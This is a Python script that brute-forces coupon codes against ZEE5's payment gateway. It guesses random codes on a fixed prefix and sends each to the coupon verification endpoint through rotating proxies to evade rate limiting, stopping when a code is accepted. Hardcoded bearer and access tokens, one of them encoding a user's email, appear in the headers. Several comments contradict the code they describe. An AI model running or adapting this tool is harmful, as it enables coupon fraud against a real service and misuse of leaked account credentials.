import requests
import random
import string

# Define the path to your proxy.txt file
proxy_file_path = 'proxy.txt'

def get_proxies_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            proxies = [line.strip() for line in file.readlines()]
            return proxies
    except Exception as e:
        print(f"Failed to read proxies from file: {str(e)}")
        return []

# Get proxies from the proxy.txt file
proxies = get_proxies_from_file(proxy_file_path)

while True:
    if not proxies:
        print("No proxies available in the file. Exiting.")
        break

    # Randomly select a proxy from the list
    selected_proxy = random.choice(proxies)

    # Generate a random string of 1 upper-case letter or digit
    random_part = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
    
    # Combine the fixed part "Z5PPAP23Q" with the random part
    custom_code = f"Z5CPMA23Y{random_part}"

    # Print the generated custom_code and selected proxy on every attempt
    print(f"Generated custom_code: {custom_code}")
    print(f"Selected Proxy: {selected_proxy}")

    # Define the request parameters
    url = f"https://securepayment.zee5.com/paymentGateway/coupon/verification?coupon_code={custom_code}&translation=en&country_code=IN"
    headers = {
        "Host": "securepayment.zee5.com",
        "Sec-Ch-Ua": "\"Chromium\";v=\"105\",3K, \"Not)A;Brand\";v=\"8\"",
      "Sec-Ch-Ua": "\"Chromium\";v=\"105\",3K, \"Not)A;Brand\";v=\"8\"",
    "Authorization": "bearer eyJraWQiOiJlNmxfbGYweHpwYVk4VzBNcFQzWlBzN2hyOEZ4Y0trbDhDV0JaekVKT2lBIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiI3MGMwZTU5NS1mNzZhLTQyMWItODEyOS1hYz72N2NlYTBhY2YiLCJzdWJzY3JpcHRpb25zIjoiW10iLCJhY3RpdmF0aW9uX2RhdGUiOiIyMDIzLTA1LTMwIDA2OjE4OjM4LjE0MyIsImFtciI6WyJkZWxlZ2F0aW9uIl0sImlzcyI6Imh0dHBzOi8vdXNlcmFwaS56ZWU1LmNvbSIsImN1cnJlbnRfY291bnRyeSI6IklOIiwiY2xpZW50X2lkIjoicmVmcmVzaF90b2tlbiIsImFjY2Vzc190b2tlbl90eXBlIjoiRGVmYXVsdFByaXZpbGVnZSIsInVzZXJfdHlwZSI6IlJlZ2lzdGVyZWQiLCJzY29wZSI6WyJ1c2VyYXBpIiwic3Vic2NyaXB0aW9uYXBpIiwicHJvZmlsZWFwaSJdLCJhdXRoX3RpbWUiOjE2ODU0Mjc1MTgsImV4cCI6MTY4ODA1NzUxOCwiaWF0IjoxNjg1NDI3NTE4LCJ1c2VyX2VtYWlsIjoidGhvcm9wQHJlZGlmZm1haWwuY29tIiwiZGV2aWNlX2lkIjoic3FXOEdpbHJwMFBpaFZkY3ZUeUUwMDAwMDAwMDAwMDAiLCJyZWdpc3RyYXRpb25fY291bnRyeSI6IklOIiwidmVyc2lvbiI6NCwiYXVkIjpbInVzZXJhcGkiLCJzdWJzY3JpcHRpb25hcGkiLCJwcm9maWxlYXBpIl0sInN5c3RlbSI6Ilo1IiwibmJmIjoxNjg1NDI3NTE4LCJpZHAiOiJsb2NhbCIsInVzZXJfaWQiOiI3MGMwZTU5NS1mNzZhLTQyMWItODEyOS1hYz72N2NlYTBhY2YiLCJjcmVhdGVkX2RhdGUiOiIyMDIzLTA1LTMwIDA2OjE4OjM4LjE0MyIsImFjdGl2YXRlZCI6dHJ1ZX0.2SHAC_7FMotO9rNpNKDPVtr6HieMF_1VgIEwFBZsyWQ76qvaDI4nfHWX7PWJfuHhZvMLjsGUHG0CcYWGPtOC50tgxjifqbMYeWy6HvkRConWaBSZOl1ZBzxR3VLQKuQ_dWNbZ0fvATWf6OHhlQRGOelP_n68Ai6WofSOOhl3QRb3LJFFXQvD6AaOYxJTYfpmedk1tG48m0wjF-q5SZNqzYfFsZYUzznTNoa4mpczRhYN8ZeWRarxl1JBj3Az4QLIX3vrzekjpSGS52Tm47_YWMCHzpUq2Ph4IpzX3my_Ii5V8O8A-HpavklF9buJAkLA1T03m0ciOTxYXehiDLto2g",
    "Sec-Ch-Ua-Mobile": "?1",
    "X-Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwbGF0Zm9ybV9jb2RlIjoiV2ViQCQhdDM4NzEyIiwiaXNzdWVkQXQiOiIyMDIzLTA1LTI5VDIxOjIwOjE3LjY5N1oiLCJwcm9kdWN0X2NvZGUiOiJ6ZWU1QDk3NSIsInR0bCI6ODY0MDAwMDAsImlhdCI6MTY4NTM5NTIxN30.OQNpUQFLdqoxZVuQuHhrRLOHE_pQktzNMP2XAQbLivE",
    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Mobile Safari/537.36",
    "Sec-Ch-Ua-Platform": "\"Android\"",
    "Accept": "*/*",
    "Origin": "https://www.zee5.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.zee5.com/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-3K,en;q=3.9",
    "Connection": "close",
        # Add your other headers here...
    }

    try:
        # Create a proxy dictionary from the selected proxy
        proxy_dict = {
            'http': f'http://{selected_proxy}',
            'https': f'http://{selected_proxy}'
        }

        # Make the GET request with a 15-second timeout
        response = requests.get(url, headers=headers, proxies=proxy_dict, timeout=2)

        # Print the response source
        print(f"Response Source:\n{response.text}\n")

        # Check if the response contains "Coupon code applied successfully"
        if "Coupon code applied successfully" in response.text:
            with open("zee5.txt", "w") as file:
                file.write(f"Coupon code applied successfully: {custom_code}")
            break  # Exit the loop if successful
        else:
            print("Attempt failed. Retrying with another proxy...")
            # Remove the used proxy from the list
            proxies.remove(selected_proxy)
    except requests.exceptions.RequestException as e:
        print(f"Request failed with exception: {e}")
        print("Retrying with another proxy...")
        # Remove the used proxy from the list
        proxies.remove(selected_proxy)

# Print a success message
print(f"Coupon code applied successfully. Response saved to zee5.txt with code: {custom_code}")
